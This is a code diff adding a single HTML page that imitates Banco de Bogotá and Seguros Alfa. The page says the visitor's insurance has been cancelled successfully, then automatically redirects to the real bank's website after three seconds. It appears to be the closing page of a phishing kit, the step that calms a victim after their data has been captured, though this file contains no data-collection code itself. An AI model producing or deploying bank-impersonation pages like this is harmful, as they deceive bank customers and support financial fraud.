@@ -1,0 +1,208 @@
+<html>
+	<head>
+  		<title>Banco de Bogotá - Seguros Alfa</title>
+  		<meta http-equiv="content-type" content="text/html; utf-8">
+  		<meta charset="utf-8">
+  		
+		<meta content="es" http-equiv="Content-Language">
+  	
+		<meta name="description" content="Todo1">
+  		<meta name="author" content="Todo1 Services">
+  		<meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved.">
+  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	   	<link rel="icon" href="wps.portal/virtual/img/favicon32.ico" type="image/x-icon">
+	   	<link href="wps.portal/virtual/css/stylesheet.css" rel="stylesheet">
+		<script type="text/javascript" src="wps.portal/js/jquery-3.6.0.min.js"></script>
+   		<style>
+   			*{
+   				font-family: 'SF Pro Display'; 
+   			}
+   			.menu-item{
+   				font-size: 16px;
+   				color: rgb(19, 31, 35);
+   				font-weight: 500;
+   				letter-spacing: normal;
+				line-height: 19px;
+				text-align: center;
+				padding: 0px 8px;
+				text-overflow: ellipsis;
+  				white-space: nowrap;
+   			}
+   			.fila{
+   				width: 90%;
+   				max-width: 1208px;
+   				margin: 0 auto;
+   			}
+   			.mostrar1{
+		    	display: none;
+		    }
+		    header{
+		    	padding-top: 20px;
+		    }
+		    .titulo-baner{
+		    	font-family: 'SF Pro Display' !important;
+		   		color: rgb(26, 26, 26);
+		   		font-weight: 900 !important;
+    			font-style: normal;	   		
+    			letter-spacing: 0px;
+    			line-height: 76px;
+    			text-transform: capitalize;
+    			font-size: 64px;
+		    }
+		    #texto-baner{
+				display: none;
+				text-align: center;				
+				font-size: 36px;
+				line-height: 40px;				
+			}
+			.titulo{
+				color: rgb(53, 53, 53);
+    			letter-spacing: 0.98px;
+    			line-height:35px;
+    			font-size: 32px;
+				font-weight: bold;
+				text-align: center;
+			}
+			.descripcion{
+				font-stretch: condensed;
+    			color: rgb(62, 69, 67);
+    			font-size: 22px;
+    			letter-spacing: 0px;
+    			line-height: 30px;
+			}
+
+			#seguro2,#seguro3,#seguro4,#seguro5,#asociados2,#asociados3,#asociados4{
+				display: none;
+			}
+
+
+			#seguros-mob{
+				display: none;
+				padding: 10px 25px;
+			}
+			#carrusel-dot{
+				display: none;
+			}
+
+			.btn-ingresar{
+				cursor: pointer;
+			}
+
+			@media (max-width:1250px) {
+				#seguro1,#seguro3,#seguro4,#seguro5,#asociados1,#asociados3,#asociados4{
+					display: none;
+				}
+				#seguro2,#asociados2{
+					display: initial;
+				}
+			}
+			
+   			@media (max-width:1025px) {
+   				header{
+			    	padding-top: 0px;
+			    }
+			    .quitar1{        
+			        display: none;    
+			    }
+			    .mostrar1{
+			    	display: initial;
+			    }
+
+			    #seguro1,#seguro3,#seguro2,#seguro5,#asociados1,#asociados2,#asociados4{
+					display: none;
+				}
+				#seguro4,#carrusel-dot,#asociados3{
+					display: initial;
+				}
+			}
+
+			
+			@media (max-width:890px) {
+				#seguros-mob{
+					display: initial;
+				}
+				#seguros-desk{
+					display: none;
+				}
+
+				.titulo{
+	    			line-height: 33px;
+	    			font-size: 30px;
+
+				}
+				.descripcion{					
+	    			font-size: 18px;	    			
+	    			line-height: 22px;
+				}
+
+
+
+			}
+
+			@media (max-width:760px) {
+				#baner-izq{
+					display: none;
+				}
+				#baner-der{
+					width: 100%;
+				}
+				#texto-baner{
+					display: block;
+				}
+			}
+
+			@media (max-width:640px) {
+				#seguro1,#seguro2,#seguro3,#seguro4,#asociados2,#asociados3,#asociados1{
+					display: none;
+				}
+				#seguro5,#asociados4{
+					display: initial;
+				}
+			}
+   		</style>
+   	</head>
+   	<body>
+   		<header class="fila">
+   			<table width="100%" cellpadding="0" cellspacing="0" border="0">
+   				<tr>
+   					<td valign="middle" align="left"><img src="wps.portal/virtual/img/logo.jpg" width="100%" style="margin-right: 20px; max-width: 389px;" class="quitar1"><img src="wps.portal/virtual/img/btn-menu.jpg" class="mostrar1"></td>
+   					<td valign="middle" class="menu-item quitar1">Descubre Alfa</td>
+   					<td valign="middle" class="menu-item quitar1">Personas</td>
+   					<td valign="middle" class="menu-item quitar1">Empresas</td>
+   					<td valign="middle" class="menu-item quitar1">Para ti</td>
+   					<td valign="middle" class="menu-item quitar1">Legal</td>
+   					<td valign="middle" class="menu-item quitar1">Atención</td>
+   					<td valign="middle" class="menu-item quitar1">Covid-19</td>
+   					<td valign="middle" align="right" class="quitar1"><img src="wps.portal/virtual/img/btn-ingreso.jpg" class="btn-ingresar"></td>
+   					<td valign="middle" align="right"><img src="wps.portal/virtual/img/btn-convertic.jpg" class="quitar1">
+   						<table class="mostrar1"><tr><td valign="middle" align="right"><img src="wps.portal/virtual/img/btn-ingreso.jpg" class="btn-ingresar"></td><td valign="middle" align="right"><img src="wps.portal/virtual/img/btn-convertic.jpg"></td></tr></table>
+   					</td>
+   				</tr>
+   			</table>
+   		</header>
+   		<main class="fila" style="text-align: center;">
+   			<br><br><br><br><br><br><br>
+			<div class="titulo">Su seguro ha sido cancelado de manera exitosa.</div>
+			<br>
+			<img src="wps.portal/virtual/img/load-verde.gif" width="120">
+			<br><br>
+   						
+	   		</div>
+   		</main>
+   		<footer class="fila">
+   			
+   		</footer>
+   	</body>
+</html>
+<script type="text/javascript">
+	$(document).ready(function() {
+		function finalizar(){
+			window.location.href='https://www.bancodebogota.com/';
+		}
+		
+		setInterval(finalizar, 3000);
+			 
+				
+	});	
+</script>
